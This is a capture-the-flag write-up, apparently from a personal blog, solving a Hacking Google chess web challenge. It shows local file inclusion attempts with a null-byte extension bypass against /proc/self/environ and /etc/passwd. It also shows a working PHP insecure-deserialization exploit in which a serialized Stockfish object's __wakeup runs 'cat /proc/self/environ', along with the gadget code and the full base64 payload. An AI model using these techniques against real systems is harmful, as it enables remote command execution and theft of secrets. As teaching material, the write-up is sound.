---
layout: post
title:  "H4CK1NG G00GL3 - EP1C03"
subtitle: "Episode 001 - Challenge 03 - Serializing Chess"
date:   2024-09-08 12:05:34 +0300
tags: [CTF, research, hacking-google, lfi, php, serialization]
readtime: true
cover-img: ["/assets/images/Hacking-Google/Hacking-Google-Cover.png"]
thumbnail-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
share-img: "/assets/images/Hacking-Google/Hacking-Google-Thumbnail.png"
---

Clicking on the next challenge, I was welcomed by a familiar sight - it's the same matrix chess game from the first challlenge of the first episode!

I noticed that this time, however, there's no "Master Login" button on the bottom of the page. Looking at the page's HTML, not much has changed. The `load_baseboard` Javascript function is still there. Let's try to use it again to access the `.php` files.

```js
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}
```

I made a request to `index.php`, `load_board.php` and `admin.php`. The latter responded with an error while the other two printed out their contents. So the local file inclusion issue is still there.

Using what I learnt from the second challenge of the previous episode, I immediately tried to access the environment variables of the process by querying `../../../proc/self/environ` but got a new error I didn't see last time - `unsupported board`. For sanity, accessing `/etc/passwd` resulted in the same error.

Looking at `load_board.php`, there's a slight change to the logic - 

```php
Loading Fen: <?php
session_save_path('/mnt/disks/sessions');
session_start();
$fen = "";
if (isset($_POST['filename']) ) {
  $allowed = array('fen', 'php', 'html');
  $filename = $_POST['filename'];
  $ext = pathinfo($filename, PATHINFO_EXTENSION);
  if (!in_array($ext, $allowed)) {
        die('unsupported board');
  }
  $fen = trim(file_get_contents($_POST['filename']));
  # XXX: Debug remove this
  echo 'Loading Fen: '. $fen;
}
else {
  die("Invalid request!");
}
```

Looks like the filename parameter goes through a simple file extension check, and the file contents are printed only if the filename ends with `.fen`, `.php` and `.html`. That's why the general LFI did not work.

I wanted to see if anything drastic had changed in `index.php`, so I put the new one and the old one in a simple text compare software -

1. The name of the page had `v2` added to it.
2. An echo that prints the values set in the `admin.php` page was removed in the newer version.
3. The winning scenario echo call was changed from `"<h1>ZOMG How did you defeat my AI :(. You definitely cheated. Here's your flag: ". getenv('REDIRECT_FLAG')` to `"<h1>Winning against me won't help anymore. You need to get the flag from my envs."`
4. The "Master Login" link was removed.

Well, it's pretty clear that the challenge no longer expects me to simply win against the AI - there's no admin panel, no way to disable the cheats, and now that it won't even print out the flag environment variable, so what's the point in winning?

I rather need to somehow directly access the server's environment variables, probably through `/proc/self/environ`. But how?

First, I tried overcoming the LFI limitation - reading the documentation on `pathinfo` and `file_get_contents` did not bring up anything promising. 

However, I tried messing around with adding a null byte to the filename passed as a paramter, something like `../../proc/self/environ\x00.php` I hoped would work, since `pathinfo` may ignore the null-byte and take  `php` as the extension, while `read_file_content` may stop at the null-byte, and read the path as `../../proc/self/environ`.

I had some difficulty passing that null-byte to the server. Finally, using `curl` and passing `load_board.php\x00.php` (as a sanity-check), successfully printed out the content of `load_board.php`. A sign that `read_file_content` really stopped at the null byte.

However, `pathinfo` seemed to also stop at the null-byte, as the endpoint printed out `unsupported_board` for inputs like `../../../etc/passwd\x00.php`. Unfortunate.

Giving up on the extension check bypass direction, I was looking for other areas to exploit.

One thing that stood out to me last time I looked at the `index.php` code is the code handling the `move_end` paramter from the user. 

If you recall, during the first exercise I found that this parameter is a simple serialized PHP array  encoded using base64. Back then, I tried changing values in it array to cheat by doing illegal moves.

After reading the source code, it turned out it makes well-made validation on the valid moves and blocks this direction.

```php
// ...
elseif (isset($_GET['move_end'])) {
    $movei = unserialize(base64_decode($_GET['move_end']));
    if ($chess->turn == "b") {
      #XXX: this should never happen.
      $chess = init_chess();
      $_SESSION['board'] = serialize($chess);
      die('Invalid Board state. Refresh the page');
    }
    echo "<!-- XXX : Debug remove this ".$movei. "-->";
	// Validation code ...
```

Looking at the beginning of the validation code again reminded me I once hear that it's always smart to be suspicious of an unserialization of unsanitized user input.

In PHP, the `unserialize` function basically accepts and unserializes any object that is valid in the current context. A valid object can be one of the built-in objects (like strings or arrays), but can also be an instance of any class currently imported.

To test it out, I spun up my own php server - `apt install php` and `php -S localhost:8050` whips a simple server serving the local directory. I wrote a short code to serialize a simple string object and `base64_encode` it.

```php
<?php
print(base64_encode(serialize("test string object")));
?>
```

On accessing the page, it prints out the string `czoxODoidGVzdCBzdHJpbmcgb2JqZWN0Ijs=`.

I tried passing this serialized string through the `move_end` parameter - sending a GET request to `https://hackerchess2-web.h4ck.ctfcompetition.com/index.php?move_end=czoxODoidGVzdCBzdHJpbmcgb2JqZWN0Ijs`.

Since the server echos `$movei` (the result of the `unserialize` call), I can inspect what happened, by searching for the specific echo in the server's entire response:

```html
<!-- ... -->
<div id="boardwrapper">
<!-- XXX : Debug remove this test string object--><table id="board">
<!-- ... -->
```

It works! The server luckily doesn't really care for state or that the move is invalid when it prints out the unserialized object.

So, I needed to find a way to exploit this. The main objective with unsafe unserialization is a way to get arbitrary code execution. 

In reality, exploiting unsafe `unserialize` calls is pretty complicated - even with full view of the server-side code. 

This is because a call to `unserialize` does nothing except create the object instance in the server's memory. So, the actual target must be to unserialize classes containing magic methods or some special implementation - so that *something* will be automatically called on the injected instance of the class, and hopefully affect enough things to allow for some control over the server's state.

For magic functions, `__destruct` is a good candidate, since it will be called when the injected unserialized object instance scope ends.

Luckily for me, there aren't many targets here. There's an imported `Chess` class, there's `MyHtmlOutput` which extends the built-in `HtmlOutput` class, and there's the `Stockfish` class. 

A quick look at the latter makes it as the obvious target - the `Stockfish` class has a `$binary` member on which it calls `proc_open` during `__construct`, effectively executing whatever command is written in `$binary`.

```php
class Stockfish
{
    public $cwd = "./";
    public $binary = "/usr/games/stockfish";
    public $other_options = array('bypass_shell' => 'true');
    public $descriptorspec = array(
        0 => array("pipe","r"),
                1 => array("pipe","w"),
    );
    private $process;
    private $pipes;
    private $thinking_time;

    public function __construct()
    {
        $other_options = array('bypass_shell' => 'true');
        //echo "Stockfish options" . $_SESSION['thinking_time'];
        if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time'])) {
            $this->thinking_time = $_SESSION['thinking_time'];
        } else {
            $this->thinking_time = 10;
        }
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
    }
```

However, I'm not able to force a call to `__construct`, as I can only unserialize an instance of `Stockfish`. There's also no `__destruct` function. 

Hmm, there's an interesting `__wakeup` function, however:

```php
public function __wakeup()
{
    $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
    echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
}
```

According [to the docs](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup), the magic function `__wakeup` is called when an object is created via `unserialize`, which is exactly the case I have!

The code itself easily enables arbitrary command execution - it calls `proc_open` again on the `binary` member. 

Now the road ahead is clear - I simply need to pass a serialized `Stockfish` object with the `binary` member changed to whatever command I want to run. Since the constructed object is saved into `$movei` and then printed out, the `Stockfish` class `__toString` function would be called:

```php
public function __toString()
{
    return fgets($this->pipes[1], 4096);
}
```

Looks like it simply prints out whatever was written to `stdout` by the executed `binary`. So, if I set the `binary` member to any command, say `cat /proc/self/environ`, its output should be reflected back to me!

Serialized objects in PHP are not too complicated in their format and can be usually constructed by hand, but I already have a PHP server running so it's way simpler letting it serialize an object for me - first, copy-paste the exact definition of the `Stockfish` class, so the object I create and serialize will exactly match the server's.

Second, a short code that creates a new `Stockfish` instance and changes its `binary` member -

```php
$stockf = new Stockfish();
$stockf->binary = 'cat /proc/self/environ';
print(base64_encode(serialize($stockf)));
```

Running the server with this new code and browsing to it, I got the string `Tzo5OiJTdG9ja2Zpc2giOjc6e3M6MzoiY3dkIjtzOjI6Ii4vIjtzOjY6ImJpbmFyeSI7czoyMjoiY2F0IC9wcm9jL3NlbGYvZW52aXJvbiI7czoxMzoib3RoZXJfb3B0aW9ucyI7YToxOntzOjEyOiJieXBhc3Nfc2hlbGwiO3M6NDoidHJ1ZSI7fXM6MTQ6ImRlc2NyaXB0b3JzcGVjIjthOjI6e2k6MDthOjI6e2k6MDtzOjQ6InBpcGUiO2k6MTtzOjE6InIiO31pOjE7YToyOntpOjA7czo0OiJwaXBlIjtpOjE7czoxOiJ3Ijt9fXM6MTg6IgBTdG9ja2Zpc2gAcHJvY2VzcyI7aTowO3M6MTY6IgBTdG9ja2Zpc2gAcGlwZXMiO2E6Mjp7aTowO2k6MDtpOjE7aTowO31zOjI0OiIAU3RvY2tmaXNoAHRoaW5raW5nX3RpbWUiO2k6MTA7fQ==`.

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep01-C03-object.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>How a PHP serialized object looks like</i></figcaption>
</figure>

I crossed my fingers and sent it this string as the `move_end` parameter to `index.php`. The server replied back with an HTML page ending ion the `<!-- XXX : Debug remove this` string, immediately followed by the `environ` file - which contained the flag! :)

<figure>
  <img style="display:block; margin-left: auto; margin-right: auto" src="/assets/images/Hacking-Google/Hacking-Google-Ep01-C03-debug.png" title="">
  <figcaption style="text-align: center; font-size:14px; color: gray"><i>I love debugging through prints</i></figcaption>
</figure>